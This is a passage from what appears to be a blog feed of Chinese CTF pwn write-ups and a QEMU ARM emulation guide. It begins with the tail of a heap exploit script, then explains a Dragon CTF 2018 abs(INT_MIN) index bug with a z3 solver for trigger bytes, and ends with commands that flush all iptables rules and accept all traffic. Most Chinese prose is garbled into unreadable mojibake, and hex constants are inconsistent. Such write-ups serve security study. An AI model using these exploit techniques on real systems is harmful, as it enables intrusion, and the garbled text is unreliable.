class="string">&#x27;fuck&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">Remove(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x3f0</span> + p64(heap_addr + <span class="number">0x10</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add(&quot;fuck&quot;,0x60,&#x27;fuck&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> incite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dragon CTF 2018 Fast Storage Writeup</title>
      <link href="dragon-ctf-2018-Fast-Storage-writeup.html"/>
      <url>dragon-ctf-2018-Fast-Storage-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å‘¨æœ«éšæ„çœ‹äº† Dragon CTF 2018 çš„é¢˜ï¼Œä¸»è¦çœ‹äº†ä¸¤ä¸ª Pwnã€‚ä¸¤ä¸ªéƒ½æŒºæœ‰æ„æ€çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜æœ‰ä¸ªå†·é—¨çŸ¥è¯†ã€‚æ‰€ä»¥æƒ³ç¨å¾®è®°å½•ä¸‹ã€‚</p><h3 id="0x01-abs-0x8000000-0x8000000"><a href="#0x01-abs-0x8000000-0x8000000" class="headerlink" title="0x01 abs(0x8000000) == 0x8000000"></a>0x01 abs(0x8000000) == 0x8000000</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸‹ <code>abs</code> è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       <span class="built_in">abs</span>, <span class="built_in">labs</span>, llabs, imaxabs - compute the absolute value of an integer</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">abs</span><span class="params">(<span class="keyword">int</span> j)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">long</span> <span class="keyword">int</span> <span class="title">labs</span><span class="params">(<span class="keyword">long</span> <span class="keyword">int</span> j)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="title">llabs</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> j)</span></span>;</span><br><span class="line"></span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">intmax_t</span> <span class="title">imaxabs</span><span class="params">(<span class="keyword">intmax_t</span> j)</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="function">Feature Test Macro Requirements <span class="keyword">for</span> <span class="title">glibc</span> <span class="params">(see feature_test_macros(<span class="number">7</span>))</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">       <span class="title">llabs</span><span class="params">()</span>:</span></span><br><span class="line">           _ISOC99_SOURCE || _POSIX_C_SOURCE &gt;= 200112L</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The  abs()  function  computes  the  absolute value of the integer argument j.  The labs(),</span><br><span class="line">       llabs() and imaxabs() functions compute the absolute value of the argument j of the  appro-</span><br><span class="line">       priate integer type <span class="keyword">for</span> the function.</span><br><span class="line"></span><br><span class="line">RETURN VALUE</span><br><span class="line">       Returns the absolute value of the integer argument, of the appropriate integer type <span class="keyword">for</span> the</span><br><span class="line">       function.</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ  abs è¿”å›çš„å‚æ•°æ˜¯ interã€‚</p><p>æˆ‘ä»¬ä¹ŸçŸ¥é“ inter çš„èŒƒå›´å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>ç±»å‹</th><th>å­—èŠ‚</th><th>èŒƒå›´</th></tr></thead><tbody><tr><td>short int</td><td>2byte(word)</td><td>0<del>32767(0</del>0x7fff)  -32768<del>-1(0x8000</del>0xffff)</td></tr><tr><td>unsigned short int</td><td>2byte(word)</td><td>0<del>65535(0</del>0xffff)</td></tr><tr><td>int</td><td>4byte(dword)</td><td>0<del>2147483647(0</del>0x7fffffff)  -2147483648<del>-1(0x80000000</del>0xffffffff)</td></tr><tr><td>unsigned int</td><td>4byte(dword)</td><td>0<del>4294967295(0</del>0xffffffff)</td></tr><tr><td>long int</td><td>8byte(qword)</td><td>æ­£: 0<del>0x7fffffffffffffff  è´Ÿ:0x8000000000000000</del>0xffffffffffffffff</td></tr><tr><td>unsigned long int</td><td>8byte(qword)</td><td>0~0xffffffffffffffff</td></tr></tbody></table><p>int  çš„è¡¨ç¤ºèŒƒå›´ä¸º <strong>0<del>2147483647(0</del>0x7fffffff)  -2147483648<del>-1(0x80000000</del>0xffffffff)</strong> , ä»¥ å¸¸ç†è€Œè¨€ï¼Œ     <code>abs</code> è¿™ä¸ªå–ç»å¯¹å€¼çš„å‡½æ•°ï¼Œè¿”å›çš„åº”è¯¥æ˜¯æ­£æ•°å§â€¦</p><p> ç„¶åè¿™é‡Œçš„ asb(0x80000000) == 0x80000000 è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ ï¼ˆinter : 0x80000000 == -2147483648)</p><p>**Why? **</p><p>å•çº¯ä»äºŒè¿›åˆ¶æ¥çœ‹ï¼š</p><p> bin(0x80000000)<br>â€˜0b10000000000000000000000000000000â€™</p><p><strong>0x80000000 == 10000000000000000000000000000000</strong> </p><p>ä½†æ˜¯ 32bitçš„ æ•´å‹æ•°å®é™…ä¸Šåªä»¥ 31 ä½è¡¨ç¤ºï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ã€‚æ¢ä¸€å¥è¯è¯´ï¼Œ0x80000000 æº¢å‡ºï¼Œè¦†ç›–åˆ°äº† ç¬¦å·ä½ã€‚åœ¨ 32bit æ•´å‹ä¸­ï¼Œå¦‚æœæ˜¯è´Ÿæ•´æ•°çš„è¯ï¼Œåˆ™è¦å°†åé¢çš„31ä¸ªäºŒè¿›åˆ¶ä½å–ååŠ 1ä¹‹åæ‰æ˜¯å…¶ç»å¯¹å€¼ã€‚</p><p>æ¢ä¸€å¥è¯è¯´   ~0 +1 == 0 ã€‚é‚£ä¹ˆ abs(0x8000000)==0x8000000 å¹¶ä¸æ˜¯æ²¡æœ‰é“ç†ã€‚</p><h3 id="0x02-åˆ©ç”¨æ€è·¯"><a href="#0x02-åˆ©ç”¨æ€è·¯" class="headerlink" title="0x02 åˆ©ç”¨æ€è·¯"></a>0x02 åˆ©ç”¨æ€è·¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">calculation</span><span class="params">(__int64 data, __int64 value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// ST18_1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST14_1</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v2 = hash1(data);</span><br><span class="line">  v3 = hahs2(data);</span><br><span class="line">  v4 = hash3(data);</span><br><span class="line">  idx = <span class="built_in">abs</span>(v2) % <span class="number">62</span>;</span><br><span class="line">  link(idx, data, value);</span><br><span class="line">  <span class="keyword">return</span> add_bitmap(idx, v3, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ abs(v1 ) è¿”å› 0x8000000 ï¼Œé‚£ä¹ˆå–æ¨¡åï¼Œ v4 çš„å€¼å®é™…ä¸Šç­‰äº -2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000555555756040 ; _DWORD name_arrary[64]</span><br><span class="line">.bss:0000555555756040 name_arrary     dd 40h dup(?)           ; DATA XREF: add_bitmap+Dâ†‘o</span><br><span class="line">.bss:0000555555756040                                         ; add_bitmap+3Dâ†‘o ...</span><br><span class="line">.bss:0000555555756140 ; _QWORD list[62]</span><br><span class="line">.bss:0000555555756140 list  </span><br></pre></td></tr></table></figure><p> è¿™æ ·æˆ‘ä»¬å¯ä»¥ bitmap å’Œ list é‡åˆã€‚</p><h3 id="0x3-code-exploit"><a href="#0x3-code-exploit" class="headerlink" title="0x3 code exploit"></a>0x3 code exploit</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—å…ˆå¾—åˆ°ä¸€ä¸ª 0x8000000ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">âœ  /tmp python solve.py</span><br><span class="line">sat</span><br><span class="line">[d = <span class="number">169</span>, c = <span class="number">230</span>, a = <span class="number">161</span>, b = <span class="number">248</span>]</span><br><span class="line">âœ  /tmp cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">a = BitVec(<span class="string">&quot;a&quot;</span>, <span class="number">32</span>)</span><br><span class="line">b = BitVec(<span class="string">&quot;b&quot;</span>, <span class="number">32</span>)</span><br><span class="line">c = BitVec(<span class="string">&quot;c&quot;</span>, <span class="number">32</span>)</span><br><span class="line">d = BitVec(<span class="string">&quot;d&quot;</span>, <span class="number">32</span>)</span><br><span class="line">s.add(a&lt;<span class="number">256</span>,b&lt;<span class="number">256</span>,c&lt;<span class="number">256</span>,d&lt;<span class="number">256</span>)</span><br><span class="line">s.add(a&gt;<span class="number">0</span>,b&gt;<span class="number">0</span>,c&gt;<span class="number">0</span>,d&gt;<span class="number">0</span>)</span><br><span class="line">s.add((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d==<span class="number">0x7fffffff</span>)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br><span class="line">âœ  /tmp python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.12</span>+ (default, Sep <span class="number">17</span> <span class="number">2016</span>, <span class="number">12</span>:<span class="number">08</span>:<span class="number">02</span>)</span><br><span class="line">[GCC <span class="number">6.2</span><span class="number">.0</span> <span class="number">20160914</span>] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">161</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">248</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="number">230</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="number">169</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d)</span><br><span class="line"><span class="string">&#x27;0x6f17fffffff&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((((<span class="number">0x1337</span>*a+<span class="number">1</span>)*b+<span class="number">1</span>)*c+<span class="number">1</span>)*d+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x6f180000000&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘è¿™é‡Œå­—ç¬¦ä¸² å– <code>\xa1\xf8\xe6\xa9</code></p><p>å‰©ä¸‹çš„åˆ©ç”¨ å‚è€ƒ <a href="https://xz.aliyun.com/t/2831#toc-2">https://xz.aliyun.com/t/2831#toc-2</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ„å»ºåµŒå…¥å¼qemu</title>
      <link href="%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html"/>
      <url>%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æ•´ä½“çš„æ€è·¯æ˜¯å…ˆç¼–è¯‘å®‰è£…å¥½qemuï¼Œä»ç½‘ä¸Šä¸‹è½½kernelå’Œinitrdç”¨äºå®‰è£…ç³»ç»Ÿï¼Œå°†ç³»ç»Ÿå®‰è£…åœ¨æˆ‘ä»¬åˆ›å»ºçš„ç¡¬ç›˜é•œåƒä¸­ï¼Œç”±äºæ²¡æœ‰grubæˆ‘ä»¬éœ€è¦ä»imgä¸­æå–å‡ºinitrdç”¨äºç³»ç»Ÿçš„bootã€‚æå–å‡ºåé€šè¿‡kernelã€initrdå’Œå®‰è£…å¥½çš„filesystemè¿è¡Œç¨‹åºã€‚</p><h2 id="ç¼–è¯‘å®‰è£…qemu"><a href="#ç¼–è¯‘å®‰è£…qemu" class="headerlink" title="ç¼–è¯‘å®‰è£…qemu"></a>ç¼–è¯‘å®‰è£…qemu</h2><p>ä¸ºäº†é¿å…ä¸€äº›ä¾èµ–å…¼å®¹æ€§çš„é—®é¢˜ï¼Œæˆ‘ç”¨ä¸€ä¸ªæ–°å»ºçš„ubuntu18.04åšå®¹å™¨ã€‚</p><p>é¦–å…ˆä»githubä¸Šä¸‹è½½qemuã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/qemu/qemu.git</span><br></pre></td></tr></table></figure><p>åœ¨å®‰è£…å‰éœ€è¦è£…ä¸€äº›ä¾èµ–ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libboost-all-dev autoconf libtool libssl-dev libpixman-1-dev libpython-dev python-pip python-capstone virtualenv bison flex</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æ—¶çš„é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼ˆé€‰äº†ä¸€å¤§å †æ¶æ„åˆ—è¡¨ï¼ŒæŠŠqemuè£…åœ¨/opt/qemuä¸­ï¼‰ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --target-list=arm-softmmu,mips-softmmu,mips64-softmmu,mips64el-softmmu,mipsel-softmmu,aarch64-softmmu,arm-linux-user,aarch64-linux-user,mips64el-linux-user,mipsel-linux-user,mips-linux-user,mips64-linux-user --prefix=/opt/qemu --python=/usr/bin/python2.7</span><br></pre></td></tr></table></figure><p>ç„¶å<code>make &amp;&amp; sudo make install </code>ä¸€æŠŠæ¢­ã€‚</p><h2 id="å®‰è£…ç³»ç»Ÿ"><a href="#å®‰è£…ç³»ç»Ÿ" class="headerlink" title="å®‰è£…ç³»ç»Ÿ"></a>å®‰è£…ç³»ç»Ÿ</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä»ç½‘ä¸Šä¸‹è½½kernelå’Œinitrdã€‚å»é•œåƒç«™å°±å¯ä»¥ä¸‹è½½åˆ°ï¼Œæ¯”å¦‚ï¼ˆæˆ‘è¿™é‡Œç”¨çš„ubuntuçš„æ¥å®‰è£…ï¼‰ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/debian/dists/buster/main/installer-armhf/current/images/netboot/</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r -nH -nd -np -R <span class="string">&quot;index.html*&quot;</span> --quiet http://ports.ubuntu.com/ubuntu-ports/dists/xenial/main/installer-armhf/current/images/generic-lpae/netboot/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯ç¬¬äºŒä¸ªã€‚</p><p>åˆ›å»ºä¸€ä¸ªç©ºçš„filesystemï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 ubuntu.img 16G</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†kernelã€initrdå’Œæ–°çš„ç¡¬ç›˜é•œåƒäº†ï¼Œç„¶åéœ€è¦åœ¨qemué‡Œé¢å®‰è£…ç³»ç»Ÿäº†ï¼Œæˆ‘çš„å®‰è£…æ–¹æ³•å¦‚ä¸‹ï¼Œè®°å¾—appendæ—¶è¦æŠŠfilesystemçš„åœ°å€æ”¹æˆramï¼ŒåŸå› æ˜¯è¦æŠŠé©±åŠ¨å®‰è£…ç¨‹åºæ”¾åœ¨å†…å­˜ä¸­è¿è¡Œï¼Œkernelå’ŒinitrdæŒ‡å®šä¹‹å‰ä¸‹è½½å¥½çš„å°±å¥½ï¼ˆæ³¨æ„å†…å­˜è®¾ç½®çš„ä¸è¦æ¯”è™šæ‹Ÿæœºå¤§å¦åˆ™ä¼šå´©æ‰ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;opt&#x2F;qemu&#x2F;bin&#x2F;qemu-system-arm -m 1024 -M virt -cpu cortex-a15 -smp cpus&#x3D;4,maxcpus&#x3D;4 -kernel .&#x2F;vmlinuz -initrd .&#x2F;initrd.gz -append &quot;root&#x3D;&#x2F;dev&#x2F;ram&quot; -drive file&#x3D;..&#x2F;ubuntu.img,if&#x3D;none,format&#x3D;qcow2,id&#x3D;hd0 -device virtio-blk-device,drive&#x3D;hd0 -netdev type&#x3D;tap,id&#x3D;net0 -device virtio-net-device,netdev&#x3D;net0,mac&#x3D;52:54:00:fa:ee:10 -nographic</span><br></pre></td></tr></table></figure><p>åœ¨å®‰è£…æ—¶ï¼Œä¼šé‡åˆ°éœ€è¦ç½‘ç»œçš„æƒ…å†µï¼ˆå®‰è£…ä¸€åŠä¼šå¡ä½ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨é…ç½®ä¸€ä¸‹ç½‘ç»œï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„ç½‘å¡åå­—æ˜¯enp0s25ï¼ˆè¿™ä¸ªæ”¹æˆè‡ªå·±çš„ï¼‰ï¼Œqemuè¿è¡Œåå¼€å¯çš„ç½‘å¡åå­—å«tap0ï¼Œæˆ‘ä»¬é…ç½®ä¸€ä¸‹tap0çš„iptablesï¼Œå¹¶è®¾ç½®å¥½ipã€‚è¿™é‡Œæ³¨æ„ä¸€ä¸‹éœ€è¦å…ˆå¯åŠ¨qemuï¼Œæˆ‘ä»¬ä¿®æ”¹qemuåˆ›å»ºçš„æ¥å£ï¼ˆtap0ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå·±åˆ›å»ºä¸€ä¸ªtap0çš„è¯qemuè¿è¡Œæ—¶ä¸ä¼šç›´æ¥ä½¿ç”¨è¿™ä¸ªtap0ï¼Œä¼šé‡æ–°åˆ›å»ºä¸€ä¸ªtap1ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># inet_ip = 192.168.100.2</span></span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¿™äº›å‘½ä»¤åqemué‡Œé¢æ‰èƒ½ä¸Šç½‘</p><p>ç„¶ååœ¨qemuçš„å®‰è£…ç•Œé¢ï¼Œæˆ‘ä»¬é…ç½®ä¸€ä¸‹å›ºå®šçš„IPï¼Œå°±æ˜¯è„šæœ¬é‡Œé¢æ”¹çš„IP(ä»»æ„ä¸€ä¸ªCæ®µç½‘éƒ½è¡Œï¼Œä¸è¦å’Œå®¿ä¸»æœºçš„ç½‘æ®µä¸€æ ·å°±å¥½ï¼Œè¿™é‡Œé…æˆäº†192.168.100.2)ã€‚ç½‘å…³å¡«å†™tap0çš„åœ°å€ï¼ŒDNSè®¾ç½®è‡ªå·±çš„DNSï¼Œå¦‚æœä¸çŸ¥é“å°±è®¾ç½®æˆ8.8.8.8æˆ–114.114.114.114ã€‚</p><p>å®‰è£…è¦è¿‡å¾ˆä¹…ï¼Œå»ºè®®æ™šä¸Šç¡å‰å®‰ï¼Œç¬¬äºŒå¤©æ”¶å‰²imgã€‚</p><p>å®‰è£…å¥½äº†åä¼šæœ‰æç¤ºç³»ç»Ÿæ²¡æ³•bootï¼Œè¿™æ˜¯æ­£å¸¸çš„ï¼Œæ¯•ç«Ÿæˆ‘ä»¬æ²¡æœ‰grubï¼Œç›´æ¥é€€å‡ºå®‰è£…å°±å¥½äº†ã€‚</p><h2 id="å¯åŠ¨å®‰è£…å¥½çš„ç³»ç»Ÿ"><a href="#å¯åŠ¨å®‰è£…å¥½çš„ç³»ç»Ÿ" class="headerlink" title="å¯åŠ¨å®‰è£…å¥½çš„ç³»ç»Ÿ"></a>å¯åŠ¨å®‰è£…å¥½çš„ç³»ç»Ÿ</h2><p>ç”±äºæˆ‘ä»¬æ²¡æœ‰grubå¸®åŠ©æˆ‘ä»¬bootï¼Œæ‰€ä»¥æˆ‘é—¨éœ€è¦æŠŠinitrdä»qcow2ä¸­æå–å‡ºæ¥ï¼Œå•ç‹¬æŒ‡å®šç»™qemuã€‚è¿™æ˜¯æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·¥å…·<code>libguestfs-tools</code>ã€‚aptä¸€æŠŠæ¢­ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libguestfs-tools -yf</span><br></pre></td></tr></table></figure><p>ç”¨virt-lsçœ‹ä¸€ä¸‹initrdçš„æ–‡ä»¶åï¼ˆåˆ«é—®æˆ‘é—®å•¥è¦åŠ è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œlogæç¤ºæˆ‘åŠ çš„ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIBGUESTFS_DEBUG&#x3D;1 LIBGUESTFS_TRACE&#x3D;1 sudo virt-ls ubuntu.img &#x2F;boot&#x2F;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠinitrd copyå‡ºæ¥</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIBGUESTFS_DEBUG=1 LIBGUESTFS_TRACE=1 sudo virt-copy-out -a ubuntu.img /boot/initrd.img-4.4.0-135-generic-lpae ./</span><br></pre></td></tr></table></figure><p>åé¢æˆ‘ä»¬å°±ç”¨æ‹·è´å‡ºæ¥çš„initrdï¼Œå®‰è£…å¥½çš„filesystemâ€”â€”ubunut.imgï¼Œä»¥åŠkernelå°†ubuntuè¿è¡Œèµ·æ¥ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/qemu/bin/qemu-system-arm -m 1024 -M virt -cpu cortex-a15 -smp cpus=4,maxcpus=4 -kernel ./vmlinuz -initrd ./initrd.img-4.4.0-135-generic-lpae -append <span class="string">&quot;root=/dev/vda2&quot;</span> -drive file=./ubuntu.img,<span class="keyword">if</span>=none,format=qcow2,id=hd0 -device virtio-blk-device,drive=hd0 -netdev <span class="built_in">type</span>=tap,id=net0 -device virtio-net-device,netdev=net0,mac=52:54:00:fa:ee:10 -nographic</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠrootæ”¹æˆ/dev/vda2ï¼Œä»ç¡¬ç›˜ä¸­å¾—åˆ°filesystemã€‚è¿è¡Œåæˆ‘ä»¬è¿˜æ˜¯éœ€è¦ä¿®æ”¹ä¸€ä¸‹tap0çš„iptableså’Œç½‘ç»œé…ç½®(natæ˜ å°„ç¥é©¬çš„ï¼Œè¿™æ ·å¤–ç½‘å¯ä»¥è®¿é—®)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Stopping firewall and allowing everyone...&quot;</span></span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t 